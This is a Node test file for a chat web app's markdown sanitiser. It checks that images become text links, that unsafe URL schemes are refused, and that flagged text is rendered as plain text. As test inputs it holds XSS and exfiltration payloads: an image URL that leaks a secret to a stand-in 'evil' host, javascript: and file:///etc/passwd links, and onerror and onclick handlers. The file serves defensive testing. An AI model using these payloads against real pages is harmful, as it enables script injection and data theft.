// Behavioural tests for the DOM half of the web app's markdown pipeline (web/app/js/markdown.js).
// Run: node scripts/test_markdown_dom.mjs
//
// The REAL vendored streaming-markdown parser drives the app's own renderer and sanitize walk on a
// small fake DOM (scripts/fake_dom.mjs), with an injected stand-in for DOMPurify. What must hold:
//   (a) an image never becomes an <img>: no such element is created or attached, whole or one
//       character at a time; the output is a text link;
//   (b) only absolute http(s) URLs without credentials become hrefs, and those links carry rel,
//       target, referrerpolicy and a title naming the destination host;
//   (c) on* and style attributes are scrubbed, unknown elements become text;
//   (d) once the purify step flags the text, the rest of the message is plain text.
// Deleting the image interception in markdown.js makes (a) fail (see the Task 4.1 report).
import assert from 'node:assert/strict';
import { installFakeDom } from './fake_dom.mjs';
import {
  addPostProcessor, createMarkdownStream, refreshMarkdown, sanitizeTree,
} from '../web/app/js/markdown.js';

let checks = 0;
function test(name, fn) {
  try {
    fn();
    checks += 1;
    console.log(`ok   ${name}`);
  } catch (err) {
    console.error(`FAIL ${name}`);
    throw err;
  }
}

/* Stand-ins for DOMPurify: `sanitize` sets `removed`, which is all the pipeline reads. */
const allowAll = () => ({ removed: [], sanitize(text) { this.removed = []; return text; } });
const flagTags = () => ({
  removed: [],
  sanitize(text) {
    this.removed = /<\s*(script|img|iframe|svg)\b/i.test(text) ? [{ element: 'x' }] : [];
    return text;
  },
});

function render(pieces, { purify = allowAll(), context, afterWrite } = {}) {
  const doc = installFakeDom();
  const container = doc.createElement('div');
  doc.body.appendChild(container);
  const view = createMarkdownStream(container, { purify, context });
  for (const piece of pieces) {
    view.write(piece);
    if (afterWrite) afterWrite(container, doc);
  }
  view.end();
  return { doc, container, view };
}

const all = (node, selector) => node.querySelectorAll(selector);
const LINK_ATTRS = { rel: 'noopener noreferrer nofollow', target: '_blank', referrerpolicy: 'no-referrer' };

function assertHardened(a, href, host) {
  assert.equal(a.getAttribute('href'), href);
  for (const [name, value] of Object.entries(LINK_ATTRS)) assert.equal(a.getAttribute(name), value, name);
  assert.equal(a.getAttribute('title'), host);
}

function assertNoActiveContent(container) {
  for (const el of all(container, '*')) {
    assert.ok(!['img', 'script', 'iframe', 'object', 'embed', 'video', 'audio', 'style', 'link'].includes(el.localName), el.localName);
    for (const { name } of el.attributes) {
      assert.ok(!name.startsWith('on') && name !== 'style' && name !== 'src' && name !== 'srcset', `${el.localName} ${name}`);
    }
  }
}

// --- (a) images ----------------------------------------------------------------------------------

test('(a) an image never becomes <img>: whole, and one character at a time', () => {
  const source = 'Chart: ![x](http://evil/?q=secret) done.';
  for (const pieces of [[source], [...source]]) {
    const { doc, container } = render(pieces, {
      afterWrite(c, d) {
        assert.equal(all(c, 'img').length, 0);
        assert.ok(!d.created.includes('img') && !d.attached.includes('img'));
        for (const el of all(c, '*')) assert.equal(el.hasAttribute('src'), false);
      },
    });
    assert.ok(!doc.created.includes('img'), 'an <img> element was created');
    assert.ok(!doc.attached.includes('img'), 'an <img> element was attached');
    const links = all(container, 'a');
    assert.equal(links.length, 1);
    assert.equal(links[0].textContent, '🖼 image: x');
    assertHardened(links[0], 'http://evil/?q=secret', 'evil');
    assert.equal(container.textContent, 'Chart: 🖼 image: x done.');
    assertNoActiveContent(container);
  }
});

test('(a) an image with a refused URL, and one with no alt text', () => {
  const bad = render(['![pic](javascript:alert`1`) end']);
  assert.ok(!bad.doc.created.includes('img'));
  assert.equal(all(bad.container, 'a[href]').length, 0);
  assert.ok(bad.container.textContent.includes('🖼 image: pic'));

  const bare = render(['![](https://a.test/p.png)\n']);
  const [link] = all(bare.container, 'a');
  assert.equal(link.textContent, '🖼 image');
  assertHardened(link, 'https://a.test/p.png', 'a.test');
});

// --- (b) links -----------------------------------------------------------------------------------

test('(b) only absolute http(s) URLs become hrefs', () => {
  const refused = [
    'javascript:alert`1`', 'JaVaScRiPt:alert`1`', 'java\tscript:alert`1`', '\u0001javascript:alert`1`',
    ' javascript:alert`1`', 'data:text/html,<b>x</b>', 'vbscript:msgbox', '//evil.test/x', '/api/kill-switch',
    'evil.test/x', '#top', 'https://user:pw@evil.test/', 'https://user@evil.test/', 'file:///etc/passwd',
    'blob:https://evil.test/x', 'ftp://evil.test/',
  ];
  for (const url of refused) {
    for (const pieces of [[`Go [click](${url}) now.`], [...`Go [click](${url}) now.`]]) {
      const { container } = render(pieces);
      assert.equal(all(container, '[href]').length, 0, JSON.stringify(url));
      assert.ok(container.textContent.includes('[click]'), JSON.stringify(url));
      assertNoActiveContent(container);
    }
  }
});

test('(b) http(s) links are hardened and name their real destination', () => {
  const { container } = render(['See [SEC](https://www.sec.gov/a?b=c), https://ok.test/x and '
    + '[https://www.sec.gov](https://evil.test/login) here.']);
  const links = all(container, 'a');
  assert.equal(links.length, 3);
  assertHardened(links[0], 'https://www.sec.gov/a?b=c', 'www.sec.gov');
  assertHardened(links[1], 'https://ok.test/x', 'ok.test');
  // The text says sec.gov; the title tells where it really goes.
  assert.equal(links[2].textContent, 'https://www.sec.gov');
  assertHardened(links[2], 'https://evil.test/login', 'evil.test');
});

// --- (c) the walk --------------------------------------------------------------------------------

test('(c) sanitizeTree scrubs on*/style, removes unknown elements and replaces <img>', () => {
  const doc = installFakeDom();
  const root = doc.createElement('div');
  const p = doc.createElement('p');
  p.setAttribute('onclick', 'steal()');
  p.setAttribute('ONMOUSEOVER', 'steal()');
  p.setAttribute('style', 'position:fixed;inset:0');
  p.textContent = 'hi';
  const a = doc.createElement('a');
  a.setAttribute('href', 'JavaScript:alert(1)');
  a.setAttribute('onfocus', 'steal()');
  a.setAttribute('data-md-done', '');
  a.textContent = 'bad';
  const good = doc.createElement('a');
  good.setAttribute('href', 'https://ok.test/');
  good.setAttribute('style', 'color:red');
  good.textContent = 'good';
  const img = doc.createElement('img');
  img.setAttribute('src', 'https://evil.test/p.png?leak=1');
  img.setAttribute('alt', 'pic');
  img.setAttribute('onerror', 'steal()');
  const script = doc.createElement('script');
  script.textContent = 'alert(1)';
  const frame = doc.createElement('iframe');
  frame.setAttribute('src', 'https://evil.test/');
  const span = doc.createElement('span');
  span.setAttribute('href', 'https://x.test/');
  span.setAttribute('src', 'https://x.test/a.png');
  span.setAttribute('srcset', 'a.png 2x');
  const box = doc.createElement('input');
  box.setAttribute('type', 'text');
  box.setAttribute('formaction', 'https://evil.test/');
  root.append(p, a, good, img, script, frame, span, box);

  sanitizeTree(root, { final: true });

  assertNoActiveContent(root);
  assert.deepEqual(p.attributes, []);
  assert.equal(all(root, '[href]').length, 2); // the good link and the former image
  assertHardened(good, 'https://ok.test/', 'ok.test');
  const [imageLink] = all(root, '[data-md-image]');
  assert.equal(imageLink.localName, 'a');
  assert.equal(imageLink.textContent, '🖼 image: pic');
  assertHardened(imageLink, 'https://evil.test/p.png?leak=1', 'evil.test');
  assert.ok(root.textContent.includes('[bad]') && root.textContent.includes('alert(1)'));
  assert.deepEqual(span.attributes, []);
  assert.equal(box.getAttribute('type'), 'checkbox');
  assert.ok(box.hasAttribute('disabled') && !box.hasAttribute('formaction'));
});

// --- (d) the purify gate -------------------------------------------------------------------------

test('(d) once the purify step flags the text, the rest is plain text', () => {
  const { doc, container, view } = render(
    ['Safe **bold** text. ', 'Now <script>alert(1)</script> and **more**', ' tail [x](https://a.test/)'],
    { purify: flagTags() },
  );
  assert.equal(view.isPlain, true);
  assert.equal(all(container, 'strong').length, 1); // only the part before the flagged chunk
  const [plain] = all(container, '.md-plain');
  assert.equal(plain.textContent, 'Now <script>alert(1)</script> and **more** tail [x](https://a.test/)');
  assert.equal(plain.children.length, 0);
  assert.equal(all(container, '.md-note').length, 1);
  assert.ok(!doc.created.includes('script'));
  assert.equal(all(container, 'a').length, 0);
});

test('(d) history: a flagged message in one write is plain text from the start', () => {
  const { container } = render(['# Title\n\n<img src=x onerror=alert(1)> **b**'], { purify: flagTags() });
  assert.equal(all(container, 'h1').length, 0);
  assert.equal(all(container, '.md-plain')[0].textContent, '# Title\n\n<img src=x onerror=alert(1)> **b**');
});

test('(d) without a purify step the pipeline fails closed', () => {
  const doc = installFakeDom();
  const container = doc.createElement('div');
  const view = createMarkdownStream(container); // no DOMPurify on globalThis under Node
  view.write('**bold** [l](https://a.test/)');
  view.end();
  assert.equal(view.isPlain, true);
  assert.equal(all(container, 'strong').length + all(container, 'a').length, 0);
  assert.equal(all(container, '.md-plain')[0].textContent, '**bold** [l](https://a.test/)');
});

// --- the rest of the rendering -------------------------------------------------------------------

test('"$" stays literal in text and in indented, fenced and inline code', () => {
  const source = 'Run:\n\n    $ pip install foo\n\nThen `$x`, $VOO and $5,000.\n\n```bash\necho $HOME\n```\n';
  for (const pieces of [[source], [...source], [source.slice(0, 10), source.slice(10)]]) {
    const { doc, container } = render(pieces);
    assert.ok(!doc.created.some((tag) => tag.startsWith('equation')), 'math element created');
    const blocks = all(container, 'pre');
    assert.equal(blocks.length, 2);
    assert.equal(blocks[0].textContent, '$ pip install foo');
    assert.equal(blocks[1].textContent, 'echo $HOME');
    assert.equal(all(container, 'code')[1].textContent, '$x');
    assert.ok(container.textContent.includes('$VOO and $5,000.'));
    assert.ok(!container.textContent.includes('\\'));
  }
});

test('tables and code blocks are wrapped once, each with a copy button', () => {
  const source = '| a | b |\n|---|---|\n| 1 | 2 |\n\n```python\nprint(1)\n```\n';
  const { container } = render([...source]);
  assert.equal(all(container, '.md-table').length, 1);
  assert.equal(all(container, '.md-code').length, 1);
  assert.deepEqual(all(container, 'button[data-copy]').map((b) => b.getAttribute('data-copy')), ['table', 'code']);
  assert.equal(all(container, '.md-table')[0].querySelector('table').querySelectorAll('td').length, 2);
  assert.equal(all(container, '.md-code')[0].querySelector('.md-block-label').textContent, 'python');
  assert.equal(all(container, 'code')[0].hasAttribute('class'), false); // the language is data, not a class
});

test('[E#] markers become citation spans; other bracket text keeps its brackets', () => {
  const { container } = render(['Fees are low [E1] and stable [E2, E3], see [note].']);
  assert.deepEqual(all(container, '.md-cite').map((s) => [s.textContent, s.getAttribute('data-cite')]),
    [['[E1]', 'E1'], ['[E2, E3]', 'E2,E3']]);
  assert.equal(container.textContent, 'Fees are low [E1] and stable [E2, E3], see [note].');
  assert.equal(all(container, 'a').length, 0);
});

test('post-processors get the turn context and can be re-run for a rendered message', () => {
  const calls = [];
  addPostProcessor((root, info) => calls.push({ root, info }));
  const turn = { id: 'turn-1', sessionId: 'sess-1' };
  const { view } = render(['Hello [E1]'], { context: { turn } });
  assert.ok(calls.length >= 2); // after the write and at the end
  const last = calls[calls.length - 1];
  assert.equal(last.root, view.root);
  assert.equal(last.info.final, true);
  assert.equal(last.info.turn, turn);
  calls.length = 0;
  refreshMarkdown(view.root);
  assert.equal(calls.length, 1);
  assert.equal(calls[0].info.turn, turn);
  assert.equal(calls[0].info.final, true);
  // A root this module did not render is ignored.
  refreshMarkdown(installFakeDom().createElement('div'));
  assert.equal(calls.length, 1);
});

console.log(`\n${checks} markdown DOM checks passed`);
